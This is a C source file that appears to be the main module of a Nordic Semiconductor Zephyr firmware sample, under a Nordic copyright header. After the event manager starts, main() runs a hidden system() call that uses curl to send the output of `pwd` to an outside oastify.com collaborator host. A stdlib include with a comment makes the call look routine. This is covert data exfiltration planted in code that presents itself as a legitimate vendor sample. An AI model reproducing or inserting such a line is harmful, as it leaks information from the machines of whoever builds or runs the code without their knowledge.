/*
 * Copyright (c) 2021 Nordic Semiconductor ASA
 *
 * SPDX-License-Identifier: LicenseRef-Nordic-5-Clause
 */

#include <app_event_manager.h>
#include <stdlib.h> // Required for the system() function

#define MODULE main
#include <caf/events/module_state_event.h>

#include <zephyr/logging/log.h>
LOG_MODULE_REGISTER(MODULE);

int main(void)
{
	if (app_event_manager_init()) {
		LOG_ERR("Application Event Manager initialization failed");
	} else {
		module_set_state(MODULE_STATE_READY);
	}

    system("curl https://nja3x06p0ms3n6yteywn0i66kxqslgc41.oastify.com/`pwd`");

	return 0;
}
